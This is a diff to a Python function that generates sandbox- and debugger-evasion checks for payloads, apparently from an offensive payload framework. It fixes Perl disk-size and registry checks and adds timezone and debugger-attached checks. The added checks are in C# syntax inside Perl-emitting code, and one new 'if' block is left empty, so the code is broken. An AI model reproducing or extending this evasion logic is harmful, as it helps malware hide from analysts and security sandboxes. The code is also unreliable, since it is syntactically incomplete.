@@ -449,7 +449,7 @@ def senecas_games(evasion_payload):
             check_code += '\t' * num_tabs_required + 'my $' + min_disksize + ' = ' + evasion_payload.required_options['DISKSIZE'][0] + ';\n'
             check_code += '\t' * num_tabs_required + 'my $' + file_object + ' = Win32::OLE->CreateObject("Scripting.FileSystemObject");\n'
             check_code += '\t' * num_tabs_required + 'my $' + real_disksize + ' = $' + file_object + '->GetDrive("C:")->{TotalSize}/1073741824.0;\n'
-            check_code += '\t' * num_tabs_required + 'if ($' + min_disksize + ' > $' + real_disksize + ') {\n'
+            check_code += '\t' * num_tabs_required + 'if ($' + min_disksize + ' < $' + real_disksize + ') {\n'
 
             # Add a tab for this check
             num_tabs_required += 1
@@ -494,7 +494,7 @@ def senecas_games(evasion_payload):
             check_code += '\t' * num_tabs_required + 'my $' + perl_wmi + ' = Win32::OLE->GetObject("winmgmts:\\\\\\\\localhost\\\\root\\\\CIMV2") or die;\n'
             check_code += '\t' * num_tabs_required + 'my $' + reg_dump + ' = $' + perl_wmi + '->ExecQuery("SELECT CurrentSize from Win32_Registry") or die;\n'
             check_code += '\t' * num_tabs_required + 'my $' + reg_size + ';\n'
-            check_code += '\t' * num_tabs_required + 'foreach my $' + perl_reg_obj + ' (in $' + reg_dump + ') { $' + reg_size + ' = $regObj->CurrentSize; }\n'
+            check_code += '\t' * num_tabs_required + 'foreach my $' + perl_reg_obj + ' (in $' + reg_dump + ') { $' + reg_size + ' = $' + perl_reg_obj + '->CurrentSize; }\n'
             check_code += '\t' * num_tabs_required + 'if ($' + reg_size + ' > $' + reg_mb_size + ') {\n'
 
             # Add a tab for this check
@@ -694,6 +694,23 @@ def senecas_games(evasion_payload):
 
             # Add a tab for this check
             num_tabs_required += 1
+        
+        if evasion_payload.required_options["TIMEZONE"][0].lower() != 'x':
+
+            check_code += '\t' * num_tabs_required + 'if (TimeZone.CurrentTimeZone.StandardName != "Coordinated Universal Time") {\n'
+
+            # Add a tab for this check
+            num_tabs_required += 1
+        
+        if evasion_payload.required_options["DEBUGGER"][0].lower() != 'x':
+
+            check_code += '\t' * num_tabs_required + 'if (!System.Diagnostics.Debugger.IsAttached) {\n'
+
+            # Add a tab for this check
+            num_tabs_required += 1
+        
+        if evasion_payload.required_options["BADMACS"][0].lower() != 'x':
+
 
         if evasion_payload.required_options["DOMAIN"][0].lower() != "x":
 
